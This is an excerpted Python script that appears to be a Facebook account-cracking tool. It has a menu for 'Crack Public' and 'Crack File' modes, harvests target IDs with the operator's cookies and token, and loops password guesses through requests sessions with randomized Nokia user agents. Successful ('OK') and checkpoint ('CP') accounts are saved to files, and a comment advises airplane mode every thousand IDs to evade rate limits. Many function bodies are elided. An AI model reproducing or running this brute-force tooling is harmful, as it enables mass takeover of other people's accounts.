...
for xd in range(10000):
    ...
    d='NokiaN8-00/111.040.1514;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='8.3.1.4 Mobile Safari/535.1 3gpp-gba'
...
def none():
	clear()
	prints(nel(f"""\t {color_text}{H2} 

   ____ ___   ___  ____     ______   __   ____  _   _    _    ____    _     _____
  / ___/ _ \ / _ \|  _ \   | __ ) \ / /  / ___|| | | |  / \  | __ )  / \   |__  /
 | |  | | | | | | | | | |  |  _ \\ V /   \___ \| |_| | / _ \ |  _ \ / _ \    / / 
 | |__| |_| | |_| | |_| |  | |_) || |     ___) |  _  |/ ___ \| |_) / ___ \  / /_ 
  \____\___/ \___/|____/   |____/_|_|__  |____/|_| |_/_/__ \_\____/_/   \_\/____|
  / ___/ _ \ / _ \|  _ \   | __ ) \ / /  | | | |  / \  |  \/  |  / \             
 | |  | | | | | | | | | |  |  _ \\ V /   | |_| | / _ \ | |\/| | / _ \            
 | |__| |_| | |_| | |_| |  | |_) || |    |  _  |/ ___ \| |  | |/ ___ \           
  \____\___/ \___/|____/   |____/ |_|    |_| |_/_/   \_\_|  |_/_/   \_\          
...
def menu(my_name,my_id):
	...
	info() 
	prints(nel(f'{B2}ID EAKAT %s %s{P2}'%((my_id),MeledakSu),width=80,padding=(0,7),style=f"{color_panel}")) 
	prints(nel(f"""{H2}《1》. Crack Public v.1 🦁🔥 FAST 🔥
《2》. Crack Public/MULTI v.1🔥 HAMA & SHABAZ 🔥 MÀX20
《3》. Crack File v.1 SHABAZ  🔥 TXT ALL 🔥
《4》. Ceck Cracked Acc   📡  TOOL & CTL + z 📡
《5》. Cek Tap Yes  🔥  OK & CP KAN 🔥
《0》. Exit""",width=80,padding=(0,7),style=f"{color_panel}"))
	Meledak = input(' HALBZHERA➥ ')
	print('')
	if Meledak in ['1']:
		dump_publik()
	elif Meledak in ['2']:
...
def dump_publik():
	...
	try:
		...
		print('╰─ Internet Error Pls Try Again')
		exit()
	except (KeyError,IOError):
		print('╰─ Your Cookies And Token Are Expired Pls Try Again..')
		exit()
def File():
			try:
				fileX = input ('\n  FILE NAME : ') 
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(' CHAND ID DAWE BO CRACK  : '))
	except ValueError:
		print('╰─ wrong type ')
		exit()
	if jum<1 or jum>100:
...
def mie():
	global prog,des
	print('')
	print(f'OK{h} Save in : {h}OK/%s {h}'%(okc))
#	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print('') 
#	prints(f' Turn ON Airplane MODE For EVERY 1K ids\n')
...
def passu():
	global prog,des
	print('')
	print(f'OK{h} Save in : {h}OK/%s {x}'%(okc))
#	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print('') 
#	prints(f' Turn ON Airplane MODE For EVERY 1K ids\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'\r[deep_green] {(loop)}/{len(id)}[/] [blue green]OK[/]:[blue green]{(ok)} [/]=[red] CP[/]:[red]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
...
def crackfree(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_blue] 🦁 {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
